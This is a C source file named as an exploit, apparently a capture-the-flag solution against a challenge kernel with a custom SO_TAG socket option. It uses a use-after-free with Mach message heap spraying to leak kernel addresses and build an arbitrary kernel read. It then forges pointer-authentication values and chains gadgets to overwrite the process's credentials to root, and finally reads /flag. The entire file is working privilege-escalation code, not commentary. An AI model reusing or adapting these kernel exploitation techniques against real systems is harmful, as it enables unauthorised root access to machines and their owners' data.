// gcc main.c md5.c -o exploit -std=c99
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <mach/mach.h>
#include "md5.h"

#define SO_TAG 0x1337
#define SO_TAG_LEN 0x50
#define TAG_LEN 0x48
#define ZONE_SIZE 8

enum TAG_OPS {
    OP_ALLOC = 0,
    OP_COPY = 1,
    OP_FREE = 3,
};

typedef struct {
    uint32_t operation;
    uint32_t padding;
    uint8_t buffer[0x40];
} __attribute__((__packed__)) tag_val_t;

struct ool_ports_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
};

struct ool_msg  {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t ool;
};

struct ool_msg_recv {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t ool;
    mach_msg_trailer_t trailer;
};

int kalloc_new_tag() {
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd <= 0) {
        printf("Socket alloc failed\n");
        exit(0);
    }

    tag_val_t* tag_val = malloc(SO_TAG_LEN);
    tag_val->operation = OP_ALLOC;
    setsockopt(sockfd, SOL_SOCKET, SO_TAG, tag_val, SO_TAG_LEN);
    free(tag_val);
    return sockfd;
}

void kfree_tag(int sockfd) {
    tag_val_t* tag_val = malloc(SO_TAG_LEN);
    tag_val->operation = OP_FREE;
    setsockopt(sockfd, SOL_SOCKET, SO_TAG, tag_val, SO_TAG_LEN);
    free(tag_val);
}

void memcpy_tag(int sockfd, tag_val_t* tag_val) {
    tag_val->operation = OP_COPY;
    setsockopt(sockfd, SOL_SOCKET, SO_TAG, tag_val, SO_TAG_LEN);
}

tag_val_t* read_tag(int sockfd) {
    tag_val_t* tag_val = malloc(SO_TAG_LEN);
    socklen_t out_len = SO_TAG_LEN;
    memset(tag_val, 0, SO_TAG_LEN);
    getsockopt(sockfd, SOL_SOCKET, SO_TAG, tag_val, &out_len);
    return tag_val;
}

mach_port_t* spray_port(mach_port_t target_port, size_t target_zone, int alloc_count) {
    int port_count = target_zone / sizeof(uint64_t);
    mach_port_t* dest_ports = malloc(alloc_count * sizeof(mach_port_t));

    kern_return_t err;
    for (int i = 0; i < alloc_count; i++) {
        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &dest_ports[i]);
        if (err != KERN_SUCCESS) {
            printf("Failed to allocate port: %s\n", mach_error_string(err));
            exit(0);
        }

        mach_port_t* ports = malloc(sizeof(mach_port_t) * port_count);
        for (int i = 0; i < port_count; i++) {
            ports[i] = target_port;
        }

        struct ool_ports_msg* msg = calloc(1, sizeof(struct ool_ports_msg));
        msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_ports_msg);
        msg->hdr.msgh_remote_port = dest_ports[i];
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414141;
        msg->body.msgh_descriptor_count = 1;
        msg->ool_ports.address = ports;
        msg->ool_ports.count = port_count;
        msg->ool_ports.deallocate = 0;
        msg->ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
        msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;

        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       (mach_msg_size_t)sizeof(struct ool_ports_msg),
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);

        free(ports);
        free(msg);

        if (err != KERN_SUCCESS) {
            printf("Failed to send message: %s\n", mach_error_string(err));
            exit(0);
        }
    }

    return dest_ports;
}

mach_port_t* spray_mem(void* mem, size_t len, int alloc_count) {
    mach_port_t* dest_ports = malloc(alloc_count * sizeof(mach_port_t));

    kern_return_t err;
    for (int i = 0; i < alloc_count; i++) {
        err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &dest_ports[i]);
        if (err != KERN_SUCCESS) {
            printf("Failed to allocate port: %s\n", mach_error_string(err));
            exit(0);
        }

        struct ool_msg* msg = calloc(1, sizeof(struct ool_msg));
        msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
        msg->hdr.msgh_remote_port = dest_ports[i];
        msg->hdr.msgh_local_port = MACH_PORT_NULL;
        msg->hdr.msgh_id = 0x41414141;
        msg->body.msgh_descriptor_count = 1;
        msg->ool.address = mem;
        msg->ool.size = len;
        msg->ool.deallocate = 0;
        msg->ool.copy = MACH_MSG_PHYSICAL_COPY;
        msg->ool.type = MACH_MSG_OOL_DESCRIPTOR;

        err = mach_msg(&msg->hdr,
                       MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                       (mach_msg_size_t)sizeof(struct ool_msg),
                       0,
                       MACH_PORT_NULL,
                       MACH_MSG_TIMEOUT_NONE,
                       MACH_PORT_NULL);

        free(msg);

        if (err != KERN_SUCCESS) {
            printf("Failed to send message: %s\n", mach_error_string(err));
            exit(0);
        }
    }

    return dest_ports;
}

uint64_t recv_mem(mach_port_t* dest_ports, int alloc_count) {
    uint8_t expected[ZONE_SIZE];
    memset(expected, 0x41, ZONE_SIZE);

    for (int i = 0; i < alloc_count; i++) {
        struct ool_msg_recv* msg = calloc(1, sizeof(struct ool_msg_recv));

        mach_msg_return_t ret = mach_msg(
        /* msg */ (mach_msg_header_t *)msg,
        /* option */ MACH_RCV_MSG,
        /* send size */ 0,
        /* recv size */ sizeof(struct ool_msg_recv),
        /* recv_name */ dest_ports[i],
        /* timeout */ MACH_MSG_TIMEOUT_NONE,
        /* notify port */ MACH_PORT_NULL);
        if (ret != MACH_MSG_SUCCESS) {
            printf("Failed to recv mach_msg: %s\n", mach_error_string(ret));
            return 0;
        }

        void* attr = msg->ool.address;
        if (memcmp(attr, expected, ZONE_SIZE)) {
            free(msg);
            return *(uint64_t*)attr;
        }
        free(msg);
    }
    return 0;
}

void set_map_copy(int sockfd, uint64_t addr) {
    tag_val_t val;
    uint64_t* copy = (uint64_t*)&val.buffer;
    copy[0] = 3;
    copy[1] = 0;
    copy[2] = 8;
    copy[3] = addr;
    copy[4] = 0x48;

    memcpy_tag(sockfd, &val);
}

void destroy_spray(mach_port_t* dest_ports, int alloc_count) {
    kern_return_t err = KERN_SUCCESS;
    for (int i = 0; i < alloc_count; i++) {
        err = mach_port_destroy(mach_task_self(), dest_ports[i]);
        if (err != KERN_SUCCESS) {
            printf("Failed to destory ports: %s\n", mach_error_string(err));
            exit(0);
        }
    }
    free(dest_ports);
}

uint64_t pac_ptr(int mode, uint64_t context, uint64_t input) {
    uint64_t stripped_input = input & 0x80007fffffffffff;
    MD5Context ctx;
    md5Init(&ctx);
    md5Update(&ctx, &mode, 4);
    md5Update(&ctx, &context, 8);
    md5Update(&ctx, &stripped_input, 8);
    md5Finalize(&ctx);

    uint16_t checksum = 0;
    for (int i = 0; i < 0x10; i+=2) {
        uint16_t part = ctx.digest[i] | (ctx.digest[i + 1] << 8);
        checksum ^= part;
    }

    uint64_t _checksum = checksum;
    return (_checksum << 0x2f) | stripped_input;
}

int num_sockets = 100;
int alloc_count = 5000;
int target_zone = 0x48;

uint64_t arbitrary_read(uint64_t kaddr) {
    void* mem = malloc(ZONE_SIZE);
    memset(mem, 0x41, ZONE_SIZE);
    mach_port_t* pre_spray = spray_mem(mem, ZONE_SIZE, alloc_count);

    int tag_sock = kalloc_new_tag();
    kfree_tag(tag_sock);

    mach_port_t* target_spray = spray_mem(mem, ZONE_SIZE, alloc_count);

    set_map_copy(tag_sock, kaddr);
    uint64_t leak = recv_mem(target_spray, alloc_count);

    destroy_spray(pre_spray, alloc_count);
    destroy_spray(target_spray, alloc_count);

    free(mem);
    close(tag_sock);
    
    return leak;
}

uint64_t leak_port(mach_port_t port) {
    mach_port_t* dest_ports = spray_port(port, target_zone, alloc_count);
    destroy_spray(dest_ports, alloc_count);

    int* sockfds = malloc(sizeof(int) * num_sockets);
    for (int i = 0; i < num_sockets; i++) {
        sockfds[i] = kalloc_new_tag();
    }

    uint64_t* leak = (uint64_t*)read_tag(sockfds[0]);
    uint64_t port_addr = leak[5];

    free(leak);
    for (int i = 0; i < num_sockets; i++) {
        kfree_tag(sockfds[i]);
        close(sockfds[i]);
    }
    free(sockfds);
    return port_addr;
}

uint64_t socket_lookup(uint64_t proc, int fd) {
    uint64_t fpd = arbitrary_read(proc + 0xc8);
    uint64_t ofiles = arbitrary_read(fpd);
    uint64_t fp = arbitrary_read(ofiles + (fd * 8));
    uint64_t glob = arbitrary_read(fp + 8);
    return arbitrary_read(glob + 0x48);
}

int main(int argc, char** argv) {
    uint64_t task_port = leak_port(mach_task_self());
    uint64_t task = arbitrary_read(task_port + 0x70);
    printf("Task address: 0x%llx\n", task);
    uint64_t proc = arbitrary_read(task + 0x2c0);
    printf("Proc address: 0x%llx\n", proc);

    int sock = kalloc_new_tag();
    uint64_t socket_addr = socket_lookup(proc, sock);
    printf("Socket address: 0x%llx\n", socket_addr);

    uint64_t tag_address = arbitrary_read(socket_addr + 0x2d0);
    printf("Tag address: 0x%llx\n", tag_address);

    uint64_t ucred = arbitrary_read(proc + 0xc0);
    printf("ucred address: 0x%llx\n", ucred);
    uint64_t uid_addr = ucred + 0x18;
    uint64_t gid_addr = ucred + 0x28;

    uint64_t gadget_1 = 0xffffff80004d815e; // mov rdi, qword ptr [rsi + 8] ; call qword ptr [rsi]
    uint64_t gadget_2 = 0xffffff8000445f36; // mov dword [rdi+0x4], 0x0 ; xor eax, eax

    uint64_t pac_vtable = pac_ptr(0, tag_address + 0x40, tag_address + 0x48);
    uint64_t pac_fn_ptr = pac_ptr(1, tag_address + 0x48, gadget_1);

    kfree_tag(sock);

    uint64_t* mem = malloc(0x10);
    mem[0] = pac_vtable;
    mem[1] = pac_fn_ptr;

    spray_mem(mem, 0x10, alloc_count);
    
    tag_val_t val;
    uint64_t* val_buf = &val.buffer;
    val_buf[0] = gadget_2;
    val_buf[1] = uid_addr - 4;
    memcpy_tag(sock, &val);

    printf("EUID: %d\n", geteuid());

    read_tag(sock);

    printf("EUID: %d\n", geteuid());

    FILE* f = fopen("/flag", "r");
    
    char flag_buf[0x100];
    fread(flag_buf, 1, 0x100, f);
    printf("%s\n", flag_buf);

    return 0;
}